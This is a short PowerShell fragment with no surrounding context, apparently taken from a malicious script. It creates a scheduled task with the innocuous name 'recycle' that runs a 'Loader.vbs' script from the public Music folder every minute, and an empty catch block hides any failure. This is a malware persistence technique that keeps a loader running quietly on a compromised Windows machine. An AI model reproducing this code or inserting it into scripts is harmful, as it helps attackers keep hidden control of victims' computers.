try 
{
schtasks.exe /create /tn recycle /sc minute  /mo 1 /tr "C:\Users\Public\Music\Loader.vbs"
} catch { }